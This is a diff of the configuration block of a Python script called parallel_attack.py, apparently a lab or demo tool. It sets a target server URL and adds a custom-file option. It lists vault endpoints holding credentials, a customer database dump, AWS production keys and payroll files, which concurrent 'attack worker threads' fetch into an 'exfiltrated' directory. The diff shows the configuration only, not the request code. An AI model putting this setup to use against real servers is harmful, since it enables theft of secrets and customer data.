@@ -16,27 +16,45 @@ import urllib.error
 # =============================================================================
 # 1. CONFIGURATION: TARGET URL & VAULT FILES (EASILY CHANGEABLE)
 # =============================================================================
-# You can pass the target URL as a command line argument, e.g.:
+# You can pass the target URL and an OPTIONAL custom file from CLI:
 #     python parallel_attack.py http://192.168.1.50:8080
-# or: python parallel_attack.py https://your-tunnel.trycloudflare.com
+#     python parallel_attack.py http://192.168.1.50:8080 my_secret.txt
+#     python parallel_attack.py my_secret.txt
 DEFAULT_TARGET_URL = "http://192.168.29.250:8080"
-TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET_URL
+
+custom_file = None
+if len(sys.argv) > 2:
+    TARGET_URL = sys.argv[1]
+    custom_file = sys.argv[2]
+elif len(sys.argv) == 2:
+    if sys.argv[1].startswith("http://") or sys.argv[1].startswith("https://"):
+        TARGET_URL = sys.argv[1]
+    else:
+        TARGET_URL = DEFAULT_TARGET_URL
+        custom_file = sys.argv[1]
+else:
+    TARGET_URL = DEFAULT_TARGET_URL
 
 # --- EDIT OR ADD FILES TO FETCH FROM THE VAULT SIMULTANEOUSLY ---
 VAULT_FILES = [
     # (Friendly Description, Vault File Endpoint)
-    ("Database Credentials",      "/vault/credentials.env.enc"),
-    ("Customer SQL Database Dump", "/vault/customer_database_dump.sql"),
-    ("Proprietary Source Code",   "/vault/source_code.zip"),
-    ("AWS Production Cloud Keys",  "/vault/aws_production_keys.env"),
-    ("Corporate Financial Passwords", "/vault/financial_passwords_2026.xlsx"),
-    ("Executive Payroll & Salaries",  "/vault/executive_payroll_salaries.pdf"),
-    ("Internal Network Topology", "/vault/internal_network_topology.txt"),
-    ("R&D Secret Project Intel",  "/vault/secret_project_intel.txt"),
+    ("Database Credentials",         "/vault/credentials.env.enc"),
+    ("Customer SQL Database Dump",    "/vault/customer_database_dump.sql"),
+    ("Proprietary Source Code",      "/vault/source_code.zip"),
+    ("AWS Production Cloud Keys",     "/vault/aws_production_keys.env"),
+    ("Corporate Financial Passwords","/vault/financial_passwords_2026.xlsx"),
+    ("Executive Payroll & Salaries", "/vault/executive_payroll_salaries.pdf"),
+    ("Internal Network Topology",    "/vault/internal_network_topology.txt"),
+    ("R&D Secret Project Intel",     "/vault/secret_project_intel.txt"),
 ]
 
-# Number of concurrent attack worker threads
-CONCURRENT_THREADS = 8
+# If a specific custom file was passed in the command line, attack only that file:
+if custom_file:
+    clean_name = custom_file.strip("/").replace("vault/", "")
+    VAULT_FILES = [(f"Custom Target File ({clean_name})", f"/vault/{clean_name}")]
+
+# Number of concurrent attack worker threads (or match custom file count)
+CONCURRENT_THREADS = min(8, max(2, len(VAULT_FILES)))
 
 # Directory to save downloaded/intercepted files for verification
 OUTPUT_DIR = "exfiltrated_parallel_evidence"
